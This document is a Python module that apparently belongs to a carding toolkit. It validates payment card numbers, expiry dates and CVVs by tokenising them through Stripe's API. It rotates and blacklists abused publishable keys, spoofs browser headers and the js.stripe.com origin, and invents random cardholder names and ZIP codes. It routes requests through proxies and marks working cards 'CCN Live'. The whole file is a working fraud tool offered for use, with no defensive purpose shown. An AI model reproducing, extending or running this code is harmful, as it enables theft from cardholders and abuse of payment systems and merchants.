import asyncio
import random
import aiohttp
from gates.hsin_stripe_auth.hsin_conf import STRIPE_KEYS
from gates.hsin_stripe_auth.bin_lookup import lookup_bin, country_flag, random_str
from gates.hsin_stripe_auth.key_manager import next_stripe_key, blacklist_key, is_key_restricted_error, BLACKLISTED_KEYS

STRIPE_API = "https://api.stripe.com/v1"
_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/131.0.0.0 Safari/537.36"
)
_TIMEOUT = aiohttp.ClientTimeout(total=30)


async def check_stripe_auth(cc: str, mm: str, yy: str, cvv: str, proxy: str = None) -> dict:
    result = {
        "status": "ERROR",
        "message": "Unknown error",
        "card_brand": "",
        "card_type": "",
        "card_country": "",
        "card_country_name": "",
        "country_flag": "",
        "bank": "",
        "is_live": False,
        "cc": f"{cc}|{mm}|{yy}|{cvv}",
        "response": "",
        "gateway_name": "Stripe Auth",
    }

    connector = aiohttp.TCPConnector(ssl=False)
    session = aiohttp.ClientSession(connector=connector)

    try:
        bin_info = await lookup_bin(session, cc[:6])
        first = random_str(6).capitalize()
        last = random_str(7).capitalize()

        pm = None
        max_attempts = min(5, len(STRIPE_KEYS))
        for attempt in range(max_attempts):
            stripe_pk = next_stripe_key()

            async with session.post(
                f"{STRIPE_API}/tokens",
                headers={
                    "User-Agent": _UA,
                    "Authorization": f"Bearer {stripe_pk}",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://js.stripe.com",
                    "Referer": "https://js.stripe.com/",
                },
                data={
                    "card[number]": cc,
                    "card[exp_month]": mm,
                    "card[exp_year]": yy,
                    "card[cvc]": cvv,
                    "card[name]": f"{first} {last}",
                    "card[address_zip]": str(random.randint(10000, 99999)),
                    "card[address_country]": "US",
                },
                proxy=proxy,
                timeout=_TIMEOUT,
            ) as pm_resp:
                pm = await pm_resp.json(content_type=None)

            if "error" in pm:
                err = pm["error"]
                code = err.get("code", "")
                msg = err.get("message", "")
                decline = err.get("decline_code", "")

                if is_key_restricted_error(code, msg):
                    blacklist_key(stripe_pk)
                    if attempt < max_attempts - 1 and len(BLACKLISTED_KEYS) < len(STRIPE_KEYS):
                        continue
                    result.update(status="ERROR", message="Key restricted — retry", response="Key restricted")
                    return result

                stripe_card = pm.get("card", {})
                result["card_brand"] = (stripe_card.get("brand") or bin_info["brand"]).upper()
                result["card_type"] = (stripe_card.get("funding") or bin_info["type"]).upper()
                result["card_country"] = stripe_card.get("country") or bin_info["country"]
                result["card_country_name"] = bin_info.get("country_name") or result["card_country"]
                result["country_flag"] = bin_info.get("country_flag") or country_flag(result["card_country"])
                result["bank"] = bin_info["bank"]

                if code in ("incorrect_number", "invalid_number"):
                    result.update(status="INVALID", message="Invalid Card Number", response="Invalid Card Number")
                elif code in ("invalid_expiry_month", "invalid_expiry_year", "expired_card"):
                    result.update(status="INVALID", message="Invalid / Expired Date", response="Invalid / Expired Date")
                elif code == "invalid_cvc":
                    result.update(status="INVALID", message="Invalid CVV", response="Invalid CVV")
                elif code == "card_declined":
                    resp = decline.replace("_", " ").title() if decline else "Card Declined"
                    detail = msg if (msg and msg.lower() != "your card was declined.") else resp
                    result.update(status="DECLINED", message=detail or resp, response=resp if resp != "Card Declined" else detail)
                elif "rate_limit" in code or "rate" in msg.lower():
                    result.update(status="ERROR", message="Rate limited — retry", response=msg or "Rate limited")
                else:
                    detail = msg or (code.replace("_", " ").title() if code else "Card Declined")
                    result.update(status="DECLINED", message=detail, response=detail)
                return result
            else:
                break

        if not pm or "error" in pm:
            return result

        stripe_card = pm.get("card", {})
        result["card_brand"] = (stripe_card.get("brand") or bin_info["brand"]).upper()
        result["card_type"] = (stripe_card.get("funding") or bin_info["type"]).upper()
        result["card_country"] = stripe_card.get("country") or bin_info["country"]
        result["card_country_name"] = bin_info.get("country_name") or result["card_country"]
        result["country_flag"] = bin_info.get("country_flag") or country_flag(result["card_country"])
        result["bank"] = bin_info["bank"]

        tok_id = pm.get("id", "")
        if not tok_id:
            result["message"] = "Failed to create token"
            result["response"] = "Failed to create token"
            return result

        result.update(status="APPROVED", is_live=True, message="CCN Live ✅", response="Payment Method Added")
        result["gateway_response"] = f"Token {tok_id}"

    except asyncio.TimeoutError:
        result["status"] = "ERROR"
        result["response"] = "Timeout"
        result["message"] = "Request timed out"
    except aiohttp.ClientError as e:
        result["status"] = "ERROR"
        result["response"] = "Connection Error"
        result["message"] = f"Connection error: {type(e).__name__}"
    except Exception as e:
        result["status"] = "ERROR"
        result["response"] = "System Error"
        result["message"] = f"{type(e).__name__}: {e}"
    finally:
        try:
            await session.close()
        except Exception:
            pass

    return result
